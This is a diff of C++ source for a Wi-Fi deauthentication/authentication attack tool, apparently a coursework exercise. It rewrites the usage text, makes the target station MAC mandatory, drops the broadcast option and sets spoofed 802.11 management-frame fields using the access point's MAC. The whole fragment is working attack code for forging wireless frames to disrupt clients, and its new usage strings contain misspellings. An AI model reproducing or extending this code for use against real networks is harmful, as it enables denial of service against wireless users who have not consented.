@@ -52,25 +52,22 @@ struct Deauth_Packet {
 
 
 void usage() {
-    cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]\n";
-    cout << "sample : deauth-attack 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
+    cout << "syntax : Aeauthentication <interface> <ap mac> [<station mac>]\n";
+    cout << "sample : Aeauthentication wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
 }
 
 int main(int argc , char * argv[]) {
 
-    if (argc != 3 && argc != 4) {
+    if (argc != 4) {
         usage();
         return -1;
     }
-    if (argc == 4) {
-        ST_MAC = argv[3];
-        cout << "Station Mac is " << ST_MAC << endl;
-    }
 
-    cout << "** Deauth Start **\n";
+    cout << "** Aeautatication Start **\n";
 
     char * Interface = argv[1];
     char * AP_MAC = argv[2];
+    char * ST_MAC = argv[3];
 
     int j=0;
 
@@ -86,12 +83,7 @@ int main(int argc , char * argv[]) {
     packet.radiotab.len = 0x000b;
     packet.d_frame.type = 0x00b0;
     packet.d_frame.dur = 0x013a;
-    if (argc==3) {
-        packet.d_frame.dst_mac = Mac("ff:ff:ff:ff:ff:ff");
-    }
-    else {
-        packet.d_frame.dst_mac = Mac(ST_MAC);
-    }
+    packet.d_frame.dst_mac = Mac(ST_MAC);
     packet.d_frame.src_mac = Mac(AP_MAC);
     packet.d_frame.bssid = Mac(AP_MAC);
     packet.w_manage.Fixed_pa.auth_SEQ = 0x0020;
